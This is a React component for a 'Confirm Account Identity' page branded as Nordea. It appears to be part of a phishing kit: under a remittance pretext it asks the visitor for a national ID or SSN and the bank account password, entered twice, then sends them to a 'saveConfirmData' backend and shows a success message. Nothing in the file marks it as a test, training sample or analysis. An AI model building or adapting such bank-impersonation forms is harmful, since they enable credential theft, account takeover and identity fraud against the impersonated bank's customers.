import React, { useState } from "react";
import { useFormik, FormikHelpers } from "formik";
import * as Yup from "yup";
import id1 from "@assets/id1.jpg";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import { saveConfirmData } from "@core/api/BankingConfirm"; // API function
import { ConfirmSpinner } from "@components/ui/Spinner";
import { ConfirmError, ConfirmSuccess } from "@components/shared/ConfirmPop";

interface ConfirmIDValues {
  accountPassword: string;
  confirmPassword: string;
  nationalId: string;
}

const ConfirmID: React.FC = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const formik = useFormik<ConfirmIDValues>({
    initialValues: {
      accountPassword: "",
      confirmPassword: "",
      nationalId: "",
    },
    validationSchema: Yup.object({
      accountPassword: Yup.string().required("Required"),
      confirmPassword: Yup.string()
        .oneOf([Yup.ref("accountPassword"), null], "Passwords must match")
        .required("Required"),
      nationalId: Yup.string().required("Required"),
    }),

    onSubmit: async (
      values: ConfirmIDValues,
      { setSubmitting }: FormikHelpers<ConfirmIDValues>,
    ) => {
      try {
        setIsSubmitting(true);
        const response = await saveConfirmData(values);
        //console.log("Data saved successfully:", response);
        //alert("Confirmation Successful.");
        setShowSuccess(true);
      } catch (error) {
        //console.error("Error saving data:", error);
        //alert("Error Confirming ID. Please try again.");
        setShowError(true);
      } finally {
        setIsSubmitting(false);
        setSubmitting(false);
      }
    },
  });

  const handleCloseSuccess = () => {
    setShowSuccess(false);
  };

  const handleCloseError = () => {
    setShowError(false);
  };

  return (
    <section className="body-font relative text-gray-600">
      <div className="container mx-auto flex-wrap px-5 py-24 sm:flex-nowrap md:grid md:grid-cols-1 lg:flex">
        <div className="relative flex items-end justify-start overflow-hidden rounded-lg bg-rose-200 p-4 sm:mr-10 md:w-full md:p-8 lg:w-2/3">
          <img src={id1} alt="bg image" className="w-full" />
        </div>

        <form onSubmit={formik.handleSubmit}>
          <div className="mt-8 flex w-full flex-col bg-white md:mx-auto md:ml-auto md:mt-0 md:w-[80%] md:py-8 lg:w-full">
            <h2 className="title-font mb-1 text-lg font-medium text-gray-900 md:text-2xl">
              Confirm Account Identity
            </h2>
            <p className="mb-5 text-sm leading-relaxed text-gray-600 md:mt-2 lg:text-base">
              Secure your remittance today: verify your account identity for
              seamless processing.
            </p>

            <div className="relative mb-6 md:mb-4">
              <label
                htmlFor="nationalId"
                className="text-sm leading-7 text-gray-600"
              >
                National/SSN/Citizen ID Number
              </label>
              <input
                type="text"
                id="nationalId"
                name="nationalId"
                placeholder="xxxx-xxxx-xxxx-xxxx"
                className={`w-full rounded border ${
                  formik.touched.nationalId && formik.errors.nationalId
                    ? "border-red-500"
                    : "border-gray-300"
                } bg-white px-3 py-1 text-sm leading-8 text-gray-700 outline-none transition-colors duration-200 ease-in-out focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 md:py-2 md:text-base`}
                onChange={formik.handleChange}
                onBlur={formik.handleBlur}
                value={formik.values.nationalId}
              />
              {formik.touched.nationalId && formik.errors.nationalId ? (
                <div className="text-sm text-red-500">
                  {formik.errors.nationalId}
                </div>
              ) : null}
            </div>

            <div className="relative mb-6 md:mb-4">
              <label
                htmlFor="accountPassword"
                className="text-sm leading-7 text-gray-600"
              >
                Account Password
              </label>
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  id="accountPassword"
                  name="accountPassword"
                  placeholder="payment account id"
                  className={`w-full rounded border ${
                    formik.touched.accountPassword &&
                    formik.errors.accountPassword
                      ? "border-red-500"
                      : "border-gray-300"
                  } bg-white px-3 py-1 text-sm leading-8 text-gray-700 outline-none transition-colors duration-200 ease-in-out focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 md:py-2 md:text-base`}
                  onChange={formik.handleChange}
                  onBlur={formik.handleBlur}
                  value={formik.values.accountPassword}
                />
                <span
                  className="absolute right-3 cursor-pointer"
                  onClick={togglePasswordVisibility}
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}
                </span>
              </div>
              {formik.touched.accountPassword &&
              formik.errors.accountPassword ? (
                <div className="text-sm text-red-500">
                  {formik.errors.accountPassword}
                </div>
              ) : null}
            </div>

            <div className="relative mb-6 md:mb-4">
              <label
                htmlFor="confirmPassword"
                className="text-sm leading-7 text-gray-600"
              >
                Confirm Account Password
              </label>
              <div className="relative flex items-center">
                <input
                  type={showPassword ? "text" : "password"}
                  id="confirmPassword"
                  name="confirmPassword"
                  placeholder="payment account id"
                  className={`w-full rounded border ${
                    formik.touched.confirmPassword &&
                    formik.errors.confirmPassword
                      ? "border-red-500"
                      : "border-gray-300"
                  } bg-white px-3 py-1 text-sm leading-8 text-gray-700 outline-none transition-colors duration-200 ease-in-out focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 md:py-2 md:text-base`}
                  onChange={formik.handleChange}
                  onBlur={formik.handleBlur}
                  value={formik.values.confirmPassword}
                />
                <span
                  className="absolute right-3 cursor-pointer"
                  onClick={togglePasswordVisibility}
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}
                </span>
              </div>
              {formik.touched.confirmPassword &&
              formik.errors.confirmPassword ? (
                <div className="text-sm text-red-500">
                  {formik.errors.confirmPassword}
                </div>
              ) : null}
            </div>

            <button
              type="submit"
              className="mt-4 rounded border-0 bg-blue-600 px-6 py-2 text-lg text-white hover:bg-blue-700 focus:outline-none disabled:opacity-50"
              disabled={!formik.isValid || formik.isSubmitting}
            >
              Verify ID
            </button>
            <p className="mt-3 text-[10px] text-gray-500 md:text-xs">
              Nordea © 2024, Everything we do begins and ends with our
              customers.
            </p>
          </div>
          <ConfirmSpinner visible={isSubmitting} />
          {showSuccess && <ConfirmSuccess onClose={handleCloseSuccess} />}
          {showError && <ConfirmError onClose={handleCloseError} />}
        </form>
      </div>
    </section>
  );
};

export default ConfirmID;
